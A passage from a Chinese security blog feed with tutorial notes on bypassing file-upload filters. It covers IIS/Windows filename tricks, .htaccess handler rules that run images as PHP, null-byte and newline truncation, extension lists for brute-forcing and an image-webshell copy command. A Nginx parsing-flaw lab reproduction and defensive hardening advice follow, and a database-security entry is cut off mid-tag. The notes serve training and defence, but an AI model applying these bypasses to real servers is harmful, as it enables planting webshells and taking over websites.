title="2、IIS服务(IIS服务部署在windows上，可以利用windows特性和IIS对应的解析漏洞绕过)"></a>2、IIS服务(IIS服务部署在windows上，可以利用windows特性和IIS对应的解析漏洞绕过)</h5><ul><li>利用windows特性绕过<ul><li>文件后面加空格(%20)会被忽略<ul><li><code>webshell.php%20</code></li></ul></li><li>文件后面加点会被忽略<ul><li><code>webshell.php.</code></li></ul></li><li>文件后面加<code>::$DATA::其他</code>，<code>::$DATA</code>后的文件会识别为文件流<ul><li><code>webshell.php::$DATA::其他</code></li></ul></li><li>会自动删除冒号后面的内容<ul><li><code>webshell.php:.jpg</code></li></ul></li></ul></li></ul><h5 id="3、Apache服务-通常运行在windows上，如果运行在Windows上，也可以使用windows特性绕过"><a href="#3、Apache服务-通常运行在windows上，如果运行在Windows上，也可以使用windows特性绕过" class="headerlink" title="3、Apache服务(通常运行在windows上，如果运行在Windows上，也可以使用windows特性绕过)"></a>3、Apache服务(通常运行在windows上，如果运行在Windows上，也可以使用windows特性绕过)</h5><ul><li><p><code>.htaccess</code>文件绕过</p><ul><li><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，通过<code>.htaccess</code>可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</li><li><code>.htaccess</code>文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。</li><li><code>.htaccess（mod_rewrite）</code>中的apache的重写模块，这个模块允许重定向发生。</li><li>前提条件：<ul><li><code>mod_rewrite</code> 模块开启</li><li><code>AllowOverride ALL</code></li></ul></li><li>先上传<code>.htaccess</code>文件,再上传<code>jpg</code>图片文件<ul><li><code>AddType application/x-httpd-php .jpg</code></li></ul></li><li><code>.htaccess</code>文件内容：</li></ul></li><li><pre><code class="hljs"># 虽然好用，但是会误伤其他正常文件，容易被发现&lt;IfModule mime_module&gt;AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行&lt;/IfModule&gt;# 精确控制能被解析成php代码的文件，不容易被发现&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行&lt;/FilesMatch&gt;# 同1没太大区别&lt;IfModule mime_module&gt;AddType application/x-httpd-php .gif&lt;/IfModule&gt;<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br><br>-   利用方式：上传覆盖`.htaccess`文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。<br>    -   0A换行绕过<br>        -   前提条件：<br>            -   Apache版本号为2.4.0-2.4.29<br>            -   服务器必须为Linux<br>            -   获取文件名时不能用`<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]`,因为它会自动把换行去掉<br>        -   使用：Burp抓包，在文件名后面增加字母`a`，在HEX编辑模式下，修改a的61为`0a`<br>            -   访问文件使用：`**webshell.php%0a**`<br>    -   多后缀上传<br>        -   前提条件：Apache版本为1.x-2.x<br>        -   上传多个后缀，如`webshell.php.qwe.swe`<br>    -   SSI命令执行漏洞<br>        -   前提条件：目标服务器开启了SSI与CGI协议<br>        -   上传`webshell.shtml`文件，即可执行`<span class="hljs-built_in">whoami</span>`命令<br><br><span class="hljs-comment">#### 利用思路-通用方法</span><br><br>-   00截断(运行环境存在漏洞，并不是代码上存在的漏洞)<br>    -   前提条件：<br>        -   PHP版本&lt;5.3.4<br>        -   `magic_quotes_gpc=Off`<br>    -   在Burp中抓上传包修改文件名为`webshell.php1`，在HEX编辑窗口，将1改为`00`；URL当中的00阶段需要使用`%00`<br><br>-   陌生后缀绕过<br><br>    -   可以将陌生后缀保存为常用字典，在测试时使用burp进行爆破<br>    -   PHP站点：`php,php5,php4,php3,php2,html,htm,phtml,phar,pht,shtml`<br>    -   ASP站点：`asp,aspx,asa,asax,ascx,ashx,asmx,cer,cdx`<br>    -   JSP站点：`jsp,jspa,jspx,jsw,jsv,jspf,jtml`<br><br>-   大小写绕过<br><br>    -   后端在设置的时候没有设置统一的大小写设置<br>    -   先获取文件名，将文件名转为字符串，调用字符串当中转小写的方法，把文件名转为小写，然后再判断这个小写的字符串在不在黑名单中<br><br>-   双写后缀绕过<br><br>    -   `webshell.pphphp`剔除`php`后就是`webshell.php`<br>    -   `webshell.p.phphp`剔除`.php`后就是`webshell.php`<br>    -   CTFHub关键代码 `<span class="hljs-variable">$name</span> = str_ireplace(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);`<br>    -   `str_ireplace(find,replace,string,count)`替换字符串中的一些字符（不区分大小写）<br>        -   `replace:` 必需。规定替换 <br>        -   `find:`中的值的值。 <br>        -   `string:`必需。规定被搜索的字符串。 <br>        -   `count:`可选。一个变量，对替换数进行计数。 <br><br>-   MIME类型绕过<br><br>    -   上传`webshell.php`，只修改`Content-Type`为图片类型，如`image/jpeg`<br><br>        -   后端只检测`Content-Type`，则只修改`Content-Type`即可绕过，无需修改后缀<br><br>    -   将一句话木马压缩进图片中(尽可能小的图片)<br>        命令：`copy 1.jpg/b+2.php 3.php`<br><br>    -   ```<br>        ie 火狐<br>        <span class="hljs-built_in">id</span> 后缀名 php识别出的文件类型<br>        0 gif image/gif<br>        1 jpg image/jpeg<br>        2 png image/png<br>        3 bmp image/bmp<br>        4 psd application/octet-stream<br>        5 ico image/x-icon<br>        6 rar application/octet-stream<br>        7 zip application/zip<br>        8 7z application/octet-stream<br>        9 exe application/octet-stream<br>        10 avi video/avi<br>        11 rmvb application/vnd.rn-realmedia-vbr<br>        12 3gp application/octet-stream<br>        13 flv application/octet-stream<br>        14 mp3 audio/mpeg<br>        15 wav audio/wav<br>        16 krc application/octet-stream<br>        17 lrc application/octet-stream<br>        18 txt text/plain<br>        19 doc application/msword<br>        20 xls application/vnd.ms-excel<br>        21 ppt application/vnd.ms-powerpoint<br>        22 pdf application/pdf<br>        23 chm application/octet-stream<br>        24 mdb application/msaccess<br>        25 sql application/octet-stream<br>        26 con application/octet-stream<br>        27 <span class="hljs-built_in">log</span> text/plain<br>        28 dat application/octet-stream<br>        29 ini application/octet-stream<br>        30 php application/octet-stream<br>        31 html text/html<br>        32 htm text/html<br>        33 ttf application/octet-stream<br>        34 fon application/octet-stream<br>        35 js application/x-javascript<br>        36 xml text/xml<br>        37 dll application/octet-stream<br>        38 dll application/octet-stream<br>        <span class="hljs-built_in">id</span> 后缀名 php识别出的文件类型<br>        0 gif image/gif<br>        1 jpg image/pjpeg<br>        2 png image/x-png<br>        3 bmp image/bmp<br>        4 psd application/octet-stream<br>        5 ico image/x-icon<br>        6 rar application/octet-stream<br>        7 zip application/x-zip-compressed<br>        8 7z application/octet-stream<br>        9 exe application/octet-stream<br>        10 avi video/avi<br>        11 rmvb application/vnd.rn-realmedia-vbr<br>        12 3gp application/octet-stream<br>        13 flv application/octet-stream<br>        14 mp3 audio/mpeg<br>        15 wav audio/wav<br>        16 krc application/octet-stream<br>        17 lrc application/octet-stream<br>        18 txt text/plain<br>        19 doc application/msword<br>        20 xls application/vnd.ms-excel<br>        21 ppt application/vnd.ms-powerpoint<br>        22 pdf application/pdf<br>        23 chm application/octet-stream<br>        24 mdb application/msaccess<br>        25 sql text/plain<br>        26 con application/octet-stream<br>        27 <span class="hljs-built_in">log</span> text/plain<br>        28 dat text/plain<br>        29 ini application/octet-stream<br>        30 php application/octet-stream<br>        31 html text/html<br>        32 htm text/html<br>        33 ttf application/octet-stream<br>        34 fon application/octet-stream<br>        35 js text/html<br>        36 xml text/xml<br>        37 dll application/octet-stream<br>        38 class application/java<br>        <br>        * application/octet-stream //应用程序<br>        323 text/h323<br>        acx application/internet-property-stream<br>        ai application/postscript<br>        aif audio/x-aiff<br>        aifc audio/x-aiff<br>        aiff audio/x-aiff<br>        asf video/x-ms-asf<br>        asr video/x-ms-asf<br>        asx video/x-ms-asf<br>        au audio/basic<br>        avi video/x-msvideo<br>        axs application/olescript<br>        bas text/plain<br>        bcpio application/x-bcpio<br>        bin application/octet-stream<br>        bmp image/bmp<br>        c text/plain<br>        <span class="hljs-built_in">cat</span> application/vnd.ms-pkiseccat<br>        cdf application/x-cdf<br>        cer application/x-x509-ca-cert<br>        class application/octet-stream<br>        clp application/x-msclip<br>        cmx image/x-cmx<br>        cod image/cis-cod<br>        cpio application/x-cpio<br>        crd application/x-mscardfile<br>        crl application/pkix-crl<br>        crt application/x-x509-ca-cert<br>        csh application/x-csh<br>        css text/css<br>        dcr application/x-director<br>        der application/x-x509-ca-cert<br>        <span class="hljs-built_in">dir</span> application/x-director<br>        dll application/x-msdownload<br>        dms application/octet-stream<br>        doc application/msword<br>        dot application/msword<br>        dvi application/x-dvi<br>        dxr application/x-director<br>        eps application/postscript<br>        etx text/x-setext<br>        evy application/envoy<br>        exe application/octet-stream<br>        fif application/fractals<br>        flr x-world/x-vrml<br>        gif image/gif<br>        gtar application/x-gtar<br>        gz application/x-gzip<br>        h text/plain<br>        hdf application/x-hdf<br>        hlp application/winhlp<br>        hqx application/mac-binhex40<br>        hta application/hta<br>        htc text/x-component<br>        htm text/html<br>        html text/html<br>        htt text/webviewhtml<br>        ico image/x-icon<br>        ief image/ief<br>        iii application/x-iphone<br>        ins application/x-internet-signup<br>        isp application/x-internet-signup<br>        jfif image/pipeg<br>        jpe image/jpeg<br>        jpeg image/jpeg<br>        jpg image/jpeg<br>        jpg image/pjpeg<br>        js application/x-javascript<br>        latex application/x-latex<br>        lha application/octet-stream<br>        lsf video/x-la-asf<br>        lsx video/x-la-asf<br>        lzh application/octet-stream<br>        m13 application/x-msmediaview<br>        m14 application/x-msmediaview<br>        m3u audio/x-mpegurl<br>        man application/x-troff-man<br>        mdb application/x-msaccess<br>        me application/x-troff-me<br>        mht message/rfc822<br>        mhtml message/rfc822<br>        mid audio/mid<br>        mny application/x-msmoney<br>        mov video/quicktime<br>        movie video/x-sgi-movie<br>        mp2 video/mpeg<br>        mp3 audio/mpeg<br>        mpa video/mpeg<br>        mpe video/mpeg<br>        mpeg video/mpeg<br>        mpg video/mpeg<br>        mpp application/vnd.ms-project<br>        mpv2 video/mpeg<br>        ms application/x-troff-ms<br>        mvb application/x-msmediaview<br>        nws message/rfc822<br>        oda application/oda<br>        p10 application/pkcs10<br>        p12 application/x-pkcs12<br>        p7b application/x-pkcs7-certificates<br>        p7c application/x-pkcs7-mime<br>        p7m application/x-pkcs7-mime<br>        p7r application/x-pkcs7-certreqresp<br>        p7s application/x-pkcs7-signature<br>        pbm image/x-portable-bitmap<br>        pdf application/pdf<br>        pfx application/x-pkcs12<br>        pgm image/x-portable-graymap<br>        pko application/ynd.ms-pkipko<br>        pma application/x-perfmon<br>        pmc application/x-perfmon<br>        pml application/x-perfmon<br>        pmr application/x-perfmon<br>        pmw application/x-perfmon<br>        png image/x-png<br>        pnm image/x-portable-anymap<br>        pot, application/vnd.ms-powerpoint<br>        ppm image/x-portable-pixmap<br>        pps application/vnd.ms-powerpoint<br>        ppt application/vnd.ms-powerpoint<br>        prf application/pics-rules<br>        ps application/postscript<br>        pub application/x-mspublisher<br>        qt video/quicktime<br>        ra audio/x-pn-realaudio<br>        ram audio/x-pn-realaudio<br>        ras image/x-cmu-raster<br>        rgb image/x-rgb<br>        rmi audio/mid<br>        roff application/x-troff<br>        rtf application/rtf<br>        rtx text/richtext<br>        scd application/x-msschedule<br>        sct text/scriptlet<br>        setpay application/set-payment-initiation<br>        setreg application/set-registration-initiation<br>        sh application/x-sh<br>        shar application/x-shar<br>        sit application/x-stuffit<br>        snd audio/basic<br>        spc application/x-pkcs7-certificates<br>        spl application/futuresplash<br>        src application/x-wais-source<br>        sst application/vnd.ms-pkicertstore<br>        stl application/vnd.ms-pkistl<br>        stm text/html<br>        sv4cpio application/x-sv4cpio<br>        sv4crc application/x-sv4crc<br>        t application/x-troff<br>        tar application/x-tar<br>        tcl application/x-tcl<br>        tex application/x-tex<br>        texi application/x-texinfo<br>        texinfo application/x-texinfo<br>        tgz application/x-compressed<br>        tif image/tiff<br>        tiff image/tiff<br>        <span class="hljs-built_in">tr</span> application/x-troff<br>        trm application/x-msterminal<br>        tsv text/tab-separated-values<br>        txt text/plain<br>        uls text/iuls<br>        ustar application/x-ustar<br>        vcf text/x-vcard<br>        vrml x-world/x-vrml<br>        wav audio/x-wav<br>        wcm application/vnd.ms-works<br>        wdb application/vnd.ms-works<br>        wks application/vnd.ms-works<br>        wmf application/x-msmetafile<br>        wps application/vnd.ms-works<br>        wri application/x-mswrite<br>        wrl x-world/x-vrml<br>        wrz x-world/x-vrml<br>        xaf x-world/x-vrml<br>        xbm image/x-xbitmap<br>        xla application/vnd.ms-excel<br>        xlc application/vnd.ms-excel<br>        xlm application/vnd.ms-excel<br>        xls application/vnd.ms-excel<br>        xlt application/vnd.ms-excel<br>        xlw application/vnd.ms-excel<br>        xof x-world/x-vrml<br>        xpm image/x-xpixmap<br>        xwd image/x-xwindowdump<br>        z application/x-compress<br>        zip application/zip -firefox<br>        application/x-zip-compressed -IE<br>        <br>        php上传压缩文件(rar,7z,zip)<br>        php上传可执行文件(exe)<br>        php上传视频文件,音乐文件,歌词文件(avi,rmvb,3gp,flv,mp3,wav,krc,lrc)<br>        php上传文本文件和文档文件(word-&gt;doc,excel-&gt;xls,幻灯片-&gt;ppt,pdf,chm)<br>        php上传数据库文件(access文件,sql文件,con文件,日志文件<span class="hljs-built_in">log</span>, dat文件)<br>        php上传网页文件,脚本文件,字体文件(ini,php,html,htm,字体文件：ttf,fon, js ,xml)<br>        php上传其他文件(class类文件,dll动态加载库文件)<br></code></pre></td></tr></table></figure></code></pre></li><li><p>上传图片马</p><ul><li>上传图片马后利用文件包含点执行图片马<ul><li>一般来说，如果先找到文件包含漏洞，才考虑使用图片马</li></ul></li></ul></li><li><p>条件竞争</p><ul><li>通常情况下，条件竞争漏洞不推荐使用，高并发请求容易对服务器造成影响</li><li>先获取上传文件，在保存文件到目录下，判断是否是php文件，如果是，删除。只有在在保存文件到目录下，判断是否是php文件这种逻辑情况下才能使用条件竞争</li></ul></li><li><p>JavaScript校验</p><ul><li>禁用js前端验证</li></ul></li></ul><h4 id="漏洞修复-加固与防御"><a href="#漏洞修复-加固与防御" class="headerlink" title="漏洞修复-加固与防御"></a>漏洞修复-加固与防御</h4><ul><li><p>使用最新版中间件</p><ul><li>及时更新中间件版本，防止使用漏洞版本</li></ul></li><li><p>正确配置中间件</p><ul><li>错误中间件配置会导致解析漏洞</li></ul></li><li><p>对保存上传文件的文件夹限制权限</p><ul><li>配置中间件，不解析上传文件夹中的文件</li></ul></li><li><p>使用白名单和MIME类型限制上传</p><ul><li>在确保以上的情况下，使用白名单和MIME结合检测文件类型和内容，着重检查文件名称中的特殊字符串</li></ul></li><li><p>增加安全设备，网站防火墙</p><ul><li>为了安全保证，最好是加上防火墙和防护设备</li></ul></li><li><p>限制文件大小</p><ul><li>假设服务器有4G内存，直接上传5G内容，导致服务器内存爆满，从而造成拒绝服务攻击</li></ul></li><li><p>OSS</p><ul><li>将所有的静态资源托管到OSS平台上，这样只需要在加载资源时，防范文件包含漏洞即可<br>不暴露上传后的文件的保存路径</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现----Nginx解析漏洞</title>
    <link href="/2022/10/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0---Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/10/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0---Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><h4 id="一、版本信息"><a href="#一、版本信息" class="headerlink" title="一、版本信息"></a>一、版本信息</h4><ul><li>Nginx 1.x 最新版</li><li>PHP 7.x 最新版</li></ul><h4 id="二、复现"><a href="#二、复现" class="headerlink" title="二、复现"></a>二、复现</h4><ul><li>环境：Ubuntu18(靶机)，Win10(攻击机)</li><li>Ubuntu中进入到Nginx文件夹中，<code>docker-compose up -d</code>启动环境</li><li>在攻击机中访问靶机地址<code>1.1.1.1/index.php</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302251916262.png" alt="image-20230225190826953"></p><ul><li>选择一个图片，使用文本编辑器在打开图片，最后一行加入一句话木马(图片不宜过大)</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302251916906.png" alt="image-20230225190956432"></p><ul><li>选择上传后，访问图片地址，并在图片地址<code>http://IP/uploadfiles/图片名称.jpg</code>后面拼上<code>/.php</code>或者一个不存在的php文件。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302251916986.png" alt="image-20230225191218679"></p><ul><li>删除镜像<code>docker-compose down</code></li></ul><h4 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h4><ul><li>该漏洞是由于配置不当引起。</li><li>由于错误配置，Nginx首先会把<code>.php</code> 结尾的文件交给<code>fastcgi</code>处理，所以才能在图片路径后面拼接一个不存在的php文件。</li><li>但是<code>fastcgi</code>在处理这个不存在的文件时，会受到<code>php.ini</code>配置文件中<code>cgi.fix_pathinfo=1</code>这个选项的影响(这项配置用于修复路径,如果当前路径不存在则采用上层路径)，到上一级中执行解析(也就是在靶机中<code>/uploadfiles/d9d99c01b2d14ca7b00c65362f88c7b7.png/aa.php</code>，<code>fastcgi</code>发现<code>aa.php</code>文件不存在会对<code>/uploadfiles/d9d99c01b2d14ca7b00c65362f88c7b7.png</code>进行解析，<code>d9d99c01b2d14ca7b00c65362f88c7b7.png</code>文件是真实存在的)，但是解析时候又受到<code>php-fpm.conf</code>中的配置选项<code>security.limit_extensions</code>的影响，只有在此选项为空的时候才能指定<code>.png</code>等其他文件转为代码解析，如果此选项后面设置参数，那么解析的时候就按设置的参数进行解析，比如：</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">security.limit_extensions = <span class="hljs-string">.php</span> <span class="hljs-string">.php3</span> <span class="hljs-string">.php4</span> <span class="hljs-string">.php5</span> <br><span class="hljs-comment">#为了安全，限制能执行的脚本后缀</span><br></code></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ul><li><p><a href="https://www.cnblogs.com/0daybug/p/13611542.html">https://www.cnblogs.com/0daybug/p/13611542.html</a></p></li><li><p><a href="https://www.laruence.com/php-internal">https://www.laruence.com/php-internal</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞原理---数据库安全和常见应用服务协议</title>
    <link href="/2022/06/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%92%8C%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/06/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%92%8C%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h3><h4 id="一、如何引发数据库服务的安全问题"><a href="#一、如何引发数据库服务的安全问题" class="headerlink" title="一、如何引发数据库服务的安全问题"></a>一、如何引发数据库服务的安全问题</h4><ol><li>配置不当—未授权访问</li><li>自身软件设计上存在缺陷—特定安全漏洞</li><li>有些服务使用口令验证进行操作，由于用户疏忽没有及时更改相关口令或设置的口令过于简单—弱口令爆破</li></ol><h4 id="二、测试大致思路"><a href="#二、测试大致思路" class="headerlink" title="二、测试大致思路"></a>二、测试大致思路</h4><ul><li>1、判断服务是否开放<ul><li>端口扫描</li><li>组合猜测</li><li>信息来源</li></ul></li><li>2、通过上一步进行端口信息判断服务类型<ul><li>数据库</li><li>文件传输</li><li>远程控制</li><li>数据通讯</li></ul></li><li>3、判断利用方式<ul><li>特性漏洞</li><li>未授权访问</li><li>弱口令爆破</li></ul></li></ul><h4 id="三、常见数据库当中漏洞"><a href="#三、常见数据库当中漏洞" class="headerlink" title="三、常见数据库当中漏洞"></a>三、常见数据库当中漏洞</h4><h5 id="MySQL未授权访问CVE-2012-2122"><a href="#MySQL未授权访问CVE-2012-2122" class="headerlink" title="MySQL未授权访问CVE-2012-2122"></a>MySQL未授权访问CVE-2012-2122</h5><h5 id="Hadoop未授权访问-内置配合命令执行RCE"><a href="#Hadoop未授权访问-内置配合命令执行RCE" class="headerlink" title="Hadoop未授权访问-内置配合命令执行RCE"></a>Hadoop未授权访问-内置配合命令执行RCE</h5><ul><li>Hadoop端口信息：50010</li></ul><h5 id="Redis未授权访问-WEBShell-任务-密匙-RCE等"><a href="#Redis未授权访问-WEBShell-任务-密匙-RCE等" class="headerlink" 